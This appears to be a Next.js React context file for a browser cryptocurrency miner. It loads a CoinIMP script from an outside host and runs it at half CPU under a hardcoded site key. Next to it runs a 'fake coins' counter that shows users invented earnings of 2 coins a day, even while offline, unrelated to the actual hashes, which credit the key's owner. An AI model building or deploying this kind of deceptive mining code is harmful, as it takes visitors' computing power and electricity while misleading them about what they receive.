
"use client";

import React, { createContext, useContext, useState, ReactNode, useCallback, useRef, useEffect } from 'react';
import Script from 'next/script';

declare global {
    interface Window {
        Client: any;
    }
}

interface MiningStats {
    hashesPerSecond: number;
    totalHashes: number;
    acceptedHashes: number;
    fakeCoins: number; // Added for fake coin simulation
}

interface MiningContextType {
    isMinerOpen: boolean;
    isMinimized: boolean;
    isMining: boolean;
    stats: MiningStats;
    minerInstance: any | null;
    openMiner: () => void;
    closeMiner: () => void;
    toggleMinimize: () => void;
    startMining: () => void;
    stopMining: () => void;
}

const MiningContext = createContext<MiningContextType | undefined>(undefined);

// --- Fake Coin Constants ---
const FAKE_COIN_RATE_PER_MS = 2 / (24 * 60 * 60 * 1000); // 2 coins per 24 hours
const LOCAL_STORAGE_FAKE_COINS = 'mintme_fake_coins';
const LOCAL_STORAGE_UPDATE_TIME = 'mintme_update_time';


export const MiningProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
    const [isMinerOpen, setIsMinerOpen] = useState(false);
    const [isMinimized, setIsMinimized] = useState(false);
    const [isMining, setIsMining] = useState(false);
    const [stats, setStats] = useState<MiningStats>({ hashesPerSecond: 0, totalHashes: 0, acceptedHashes: 0, fakeCoins: 0 });
    const [minerInstance, setMinerInstance] = useState<any | null>(null);
    
    const statsIntervalRef = useRef<NodeJS.Timeout | null>(null);
    const fakeCoinIntervalRef = useRef<NodeJS.Timeout | null>(null);
    
    const SITE_KEY = 'c541f766e3a569d2f01a1e9b0e96fd02e62d2cc7886f8c03a646befe8911df6a';
    const THROTTLE = 0.5; // 50% CPU usage

    const initializeMiner = useCallback(() => {
        if (typeof window !== 'undefined' && window.Client && !minerInstance) {
            console.log("Initializing CoinIMP Miner...");
            const miner = new window.Client.Anonymous(SITE_KEY, { throttle: THROTTLE, c: 'w' });
            setMinerInstance(miner);
        }
    }, [minerInstance]);

    // Effect to initialize the miner script
    useEffect(() => {
        return () => {
            if (minerInstance) {
                minerInstance.stop();
            }
            if (statsIntervalRef.current) clearInterval(statsIntervalRef.current);
            if (fakeCoinIntervalRef.current) clearInterval(fakeCoinIntervalRef.current);
        };
    }, [minerInstance]);
    
    // Effect to initialize fake coins from local storage
    useEffect(() => {
        try {
            const savedCoins = parseFloat(localStorage.getItem(LOCAL_STORAGE_FAKE_COINS) || '0');
            const lastUpdateTime = parseInt(localStorage.getItem(LOCAL_STORAGE_UPDATE_TIME) || String(Date.now()), 10);
            const timePassed = Date.now() - lastUpdateTime;

            const offlineCoinsEarned = timePassed > 0 ? timePassed * FAKE_COIN_RATE_PER_MS : 0;
            const initialCoins = savedCoins + offlineCoinsEarned;

            setStats(prev => ({...prev, fakeCoins: initialCoins}));
            localStorage.setItem(LOCAL_STORAGE_FAKE_COINS, String(initialCoins));
            localStorage.setItem(LOCAL_STORAGE_UPDATE_TIME, String(Date.now()));
        } catch (e) {
            console.error("Failed to initialize fake coins:", e);
        }
    }, []);

    const startMining = useCallback(() => {
        if (!minerInstance || isMining) return;
        
        minerInstance.start();
        setIsMining(true);

        statsIntervalRef.current = setInterval(() => {
            setStats(prev => ({
                ...prev,
                hashesPerSecond: minerInstance.getHashesPerSecond(),
                totalHashes: minerInstance.getTotalHashes(),
                acceptedHashes: minerInstance.getAcceptedHashes(),
            }));
        }, 1000);

        // Start fake coin interval
        fakeCoinIntervalRef.current = setInterval(() => {
            setStats(prev => {
                const newCoins = prev.fakeCoins + FAKE_COIN_RATE_PER_MS;
                localStorage.setItem(LOCAL_STORAGE_FAKE_COINS, String(newCoins));
                localStorage.setItem(LOCAL_STORAGE_UPDATE_TIME, String(Date.now()));
                return {...prev, fakeCoins: newCoins};
            });
        }, 1000);
    }, [minerInstance, isMining]);

    const stopMining = useCallback(() => {
        if (!minerInstance || !isMining) return;

        minerInstance.stop();
        setIsMining(false);
        if (statsIntervalRef.current) clearInterval(statsIntervalRef.current);
        if (fakeCoinIntervalRef.current) clearInterval(fakeCoinIntervalRef.current);
        
        // Final save on stop
        localStorage.setItem(LOCAL_STORAGE_UPDATE_TIME, String(Date.now()));

        setStats(prev => ({...prev, hashesPerSecond: 0, totalHashes: 0, acceptedHashes: 0 }));
    }, [minerInstance, isMining]);

    const openMiner = () => {
        if (!minerInstance) {
            initializeMiner();
        }
        setIsMinerOpen(true);
    }

    const closeMiner = () => {
        if(isMining) {
            stopMining();
        }
        setIsMinerOpen(false);
    }
    
    const toggleMinimize = () => setIsMinimized(prev => !prev);
    
    return (
        <MiningContext.Provider value={{ isMinerOpen, isMinimized, isMining, stats, minerInstance, openMiner, closeMiner, toggleMinimize, startMining, stopMining }}>
            <Script
                id="coinimp-miner-script"
                src="https://www.hostingcloud.racing/YCcn.js"
                strategy="lazyOnload" // Use lazyOnload to ensure it doesn't block other page content
                onLoad={initializeMiner}
            />
            {children}
        </MiningContext.Provider>
    );
};

export const useMining = () => {
    const context = useContext(MiningContext);
    if (context === undefined) {
        throw new Error('useMining must be used within a MiningProvider');
    }
    return context;
};
